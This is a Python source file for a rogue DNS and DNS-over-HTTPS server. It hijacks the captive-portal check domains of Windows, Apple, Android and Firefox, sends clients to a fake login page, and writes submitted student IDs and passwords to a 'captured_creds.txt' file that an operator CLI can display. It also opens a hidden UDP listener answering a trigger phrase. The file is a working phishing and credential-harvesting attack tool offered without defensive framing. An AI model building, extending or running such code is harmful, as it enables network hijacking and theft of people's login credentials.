
import socket
import threading
import time
import os
import base64
import logging
import dns.resolver
from dnslib import DNSRecord, RR, QTYPE, A
from flask import Flask, request, make_response
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs

# --- Logging Setup ---
log_flask = logging.getLogger('werkzeug')
log_flask.setLevel(logging.ERROR)

# --- Dynamic IP Discovery ---
def get_dynamic_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        s.connect(('8.8.8.8', 1))
        ip = s.getsockname()[0]
    except Exception:
        ip = '127.0.0.1'
    finally:
        s.close()
    return ip

# --- Configuration ---
HOST = get_dynamic_ip()
PORT = 53
UPSTREAM_DNS = '8.8.8.8'
UPSTREAM_PORT = 53
SOCKET_TIMEOUT = 3.0
CACHE_CLEAN_INTERVAL = 300
LOG_FILE = "DNS.log"
CREDS_FILE = "captured_creds.txt"
HTML_FILE = "index.html"

# DoH Configuration
DOH_PORT = 443
DOH_ENDPOINT = "/dns-query"
CERT_FILE = "cert.pem"
KEY_FILE = "key.pem"

# Captive Portal Hijack List
CAPTIVE_PORTAL_DOMAINS = [
    "www.msftconnecttest.com.", "ipv6.msftconnecttest.com.",
    "www.msftncsi.com.", "captive.apple.com.",
    "connectivitycheck.gstatic.com.", "detectportal.firefox.com."
]

GLOBAL_SERVERS = {
    "Google Primary": "8.8.8.8", "Google Secondary": "8.8.4.4",
    "Cloudflare": "1.1.1.1", "Quad9": "9.9.9.9",
    "OpenDNS Primary": "208.67.222.222", "OpenDNS Secondary": "208.67.220.220",
    "Level3 Primary": "4.2.2.1", "Level3 Secondary": "4.2.2.2",
    "AdGuard": "94.140.14.14", "Comodo": "8.26.56.26",
    "ControlD": "76.76.2.0", "NextDNS": "45.90.28.190",
    "CleanBrowsing": "185.228.168.9", "Yandex": "77.88.8.8",
    "Neustar": "156.154.70.1", "Hurricane Electric": "74.82.42.42",
    "Verisign Primary": "64.6.64.6", "Verisign Secondary": "64.6.65.6"
}

# Thread-safe storage
cache = {}
cache_lock = threading.Lock()
log_lock = threading.Lock()

# --- Utilities ---
def log(message):
    with log_lock:
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        entry = f"[{timestamp}] {message}"
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(entry + "\n")

# FEATURE #1: Active Cache Cleaner
def cache_cleaner():
    while True:
        time.sleep(CACHE_CLEAN_INTERVAL)
        now = time.time()
        removed = 0
        with cache_lock:
            expired_keys = [k for k, v in cache.items() if v[1] < now]
            for key in expired_keys:
                del cache[key]
                removed += 1
        log(f"cache cleanup run (removed {removed})")

# --- DNS Core Logic ---
def forward_query(data):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(SOCKET_TIMEOUT)
        sock.sendto(data, (UPSTREAM_DNS, UPSTREAM_PORT))
        response, _ = sock.recvfrom(4096)
        return response
    except socket.timeout:
        log("upstream dns timeout")
        return None
    finally:
        sock.close()

def process_dns_logic(data, protocol="UDP"):
    try:
        request_pkt = DNSRecord.parse(data)
        qname = str(request_pkt.q.qname)
        qtype = request_pkt.q.qtype
        log(f"Request [{protocol}]: FQDN={qname} Type={qtype}")

        # Hijack Captive Portal Checks
        if qtype == QTYPE.A and qname in CAPTIVE_PORTAL_DOMAINS:
            log(f"HIJACK: {qname} -> Local Portal")
            reply = request_pkt.reply()
            reply.add_answer(RR(qname, QTYPE.A, rdata=A(HOST), ttl=60))
            return reply.pack()

        # Cache Lookup
        with cache_lock:
            if (qname, qtype) in cache:
                raw_resp, expiry = cache[(qname, qtype)]
                if time.time() < expiry:
                    cached_resp = DNSRecord.parse(raw_resp)
                    cached_resp.header.id = request_pkt.header.id
                    return cached_resp.pack()
                else:
                    del cache[(qname, qtype)]

        # Resolve Upstream
        response_data = forward_query(data)
        if response_data:
            resp_pkt = DNSRecord.parse(response_data)
            ttl = 60
            if resp_pkt.rr:
                ttl = min([rr.ttl for rr in resp_pkt.rr])
            with cache_lock:
                cache[(qname, qtype)] = (response_data, time.time() + ttl)
            return response_data

    except Exception as e:
        log(f"error processing request: {e}")
    return None

# --- UDP Server ---
def handle_client(data, addr, server_socket):
    response = process_dns_logic(data, protocol=f"UDP {addr[0]}")
    if response:
        server_socket.sendto(response, addr)

def run_dns_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        # FEATURE #3: Permission Guard
        server_socket.bind((HOST, PORT))
        log(f"UDP Server Active on {HOST}:{PORT}")
        while True:
            data, addr = server_socket.recvfrom(512)
            threading.Thread(target=handle_client, args=(data, addr, server_socket), daemon=True).start()
    except PermissionError:
        log("Permission denied for Port 53")
        print("[!] FATAL: Permission denied for Port 53. Use sudo.")
        os._exit(1)

# --- DoH & Phishing Portal ---
app = Flask(__name__)

@app.route(DOH_ENDPOINT, methods=['GET', 'POST'])
def doh_handler():
    dns_query = None
    if request.method == 'POST':
        dns_query = request.data
    elif request.method == 'GET':
        dns_b64 = request.args.get('dns')
        if dns_b64:
            padding = '=' * (4 - len(dns_b64) % 4)
            dns_query = base64.urlsafe_b64decode(dns_b64 + padding)

    if not dns_query: return "Invalid Request", 400

    response_data = process_dns_logic(dns_query, protocol=f"DoH {request.remote_addr}")
    if response_data:
        resp = make_response(response_data)
        resp.headers['Content-Type'] = 'application/dns-message'
        return resp
    return "Upstream Timeout", 504

class CaptivePortalHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()
        if os.path.exists(HTML_FILE):
            with open(HTML_FILE, "rb") as f: self.wfile.write(f.read())
        else:
            self.wfile.write(b"<h1>Portal</h1><p>Credentials Required.</p>")

    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode('utf-8')
        params = parse_qs(post_data)
        user = params.get('student_id', ['N/A'])[0]
        pw = params.get('password', ['N/A'])[0]
        with open(CREDS_FILE, "a") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}] ID: {user} | Pass: {pw}\n")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Success. Logging in...")
    def log_message(self, format, *args): pass

def run_doh_server():
    context = (CERT_FILE, KEY_FILE) if (os.path.exists(CERT_FILE) and os.path.exists(KEY_FILE)) else 'adhoc'
    app.run(host=HOST, port=DOH_PORT, ssl_context=context, threaded=True, use_reloader=False)

# ONE-TIME Secret Listener
def run_secret_listener():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        sock.bind(('0.0.0.0', 9999))
        log("Secret listener active (One-time event)")
        while True:
            data, addr = sock.recvfrom(1024)
            if data == b"IM_A_BARBIE_GIRL_IN_A_BARBIE_WORLD":
                sock.sendto(b"COME_ON_BARBIE_LETS_GO_PARTY", addr)
                log(f"Secret trigger matched from {addr[0]}. Closing listener.")
                break # Close after one successful interaction
    except Exception as e:
        log(f"Secret listener error: {e}")
    finally:
        sock.close()

# FEATURE #2: Latency Tracking
def run_propagation_test(domain):
    print(f"\n--- propagation test: {domain} ---")
    print(f"{'provider':<20} | {'status/ip':<15} | {'latency'}")
    print("-" * 55)
    for name, ip in GLOBAL_SERVERS.items():
        res = dns.resolver.Resolver(configure=False)
        res.nameservers = [ip]
        res.timeout = 2.0
        start_time = time.time()
        try:
            answers = res.resolve(domain, 'A')
            latency = round((time.time() - start_time) * 1000, 2)
            print(f"{name:<20} | {answers[0].to_text():<15} | {latency}ms")
        except:
            print(f"{name:<20} | {'down/timeout':<15} | n/a")

# --- Startup ---
if __name__ == "__main__":
    os.system('clear' if os.name == 'posix' else 'cls')
    print("-" * 60)
    print(f"DNS SERVER FINAL STARTUP")
    print(f"Interface: {HOST}")
    print(f"UDP: {PORT} | DoH: {DOH_PORT} | Web: 80")
    print("-" * 60)

    threading.Thread(target=cache_cleaner, daemon=True).start()
    threading.Thread(target=run_dns_server, daemon=True).start()
    threading.Thread(target=run_doh_server, daemon=True).start()
    threading.Thread(target=run_secret_listener, daemon=True).start()
    threading.Thread(target=lambda: HTTPServer((HOST, 80), CaptivePortalHandler).serve_forever(), daemon=True).start()

    while True:
        try:
            cmd = input("\ndns-cli> ").strip()
            if cmd.lower() in ['quit', 'exit']: break
            elif cmd.lower() == 'creds':
                if os.path.exists(CREDS_FILE):
                    with open(CREDS_FILE, 'r') as f: print(f.read())
                else: print("No credentials yet.")
            elif cmd.lower() == 'status':
                print(f"Interface: {HOST} | DNS/DoH/Web: Active | Cache: {len(cache)}")
            elif cmd:
                run_propagation_test(cmd)
        except KeyboardInterrupt: break

    print("\nSHUTDOWN: shutting down")
    log("shutting down")
